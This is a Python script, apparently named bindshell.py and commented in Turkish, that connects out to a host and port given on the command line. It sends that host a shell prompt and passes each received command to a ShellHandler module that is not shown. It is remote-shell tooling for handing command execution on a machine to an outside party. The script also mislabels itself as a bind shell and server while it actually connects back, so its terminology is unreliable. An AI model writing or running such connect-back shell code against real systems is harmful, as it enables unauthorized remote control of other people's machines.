import socket
import threading
import sys
from shell_handler import ShellHandler  # shell_handler.py'den ShellHandler sınıfını içeri aktarıyoruz.

class BindShell:
    def __init__(self, remote_host, remote_port):
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.server_socket = None
        self.shell_handler = ShellHandler()  # ShellHandler sınıfını başlatıyoruz.

    def start_server(self):
        """Bind shell server başlatma fonksiyonu."""
        try:
            # Bağlanılacak uzak sunucuya bağlanmak için istemci soketi oluşturuyoruz
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.connect((self.remote_host, self.remote_port))  # Uzak sunucuya bağlanıyoruz
            print(f"[*] Connected to {self.remote_host}:{self.remote_port}")

            # Sunucudan gelen bağlantıyı bekliyoruz
            self.server_socket.send(b"Welcome to the bind shell! Type 'exit' to quit.\n")
            self.listen_for_commands()

        except Exception as e:
            print(f"Error connecting to remote host: {str(e)}")

    def listen_for_commands(self):
        """Uzak sunucudan gelen komutları dinleyen fonksiyon."""
        try:
            while True:
                self.server_socket.send(b"intshell > ")
                command = self.server_socket.recv(1024).decode("utf-8").strip()

                if command.lower() == "exit":
                    print(f"[*] Closing connection with {self.remote_host}:{self.remote_port}")
                    self.server_socket.close()
                    break
                elif command:
                    self.shell_handler.process_command(command)  # ShellHandler sınıfındaki komut işleme fonksiyonunu kullanıyoruz.
        except Exception as e:
            print(f"Error handling commands: {str(e)}")
            self.server_socket.close()

if __name__ == "__main__":
    # Sys.argv ile remote host ve port almak
    if len(sys.argv) < 3:
        print("Usage: python3 bindshell.py <remote_host> <remote_port>")
        sys.exit(1)

    remote_host = sys.argv[1]  # Uzak sunucu IP adresi
    remote_port = int(sys.argv[2])  # Uzak sunucu portu

    bind_shell = BindShell(remote_host, remote_port)
    bind_shell.start_server()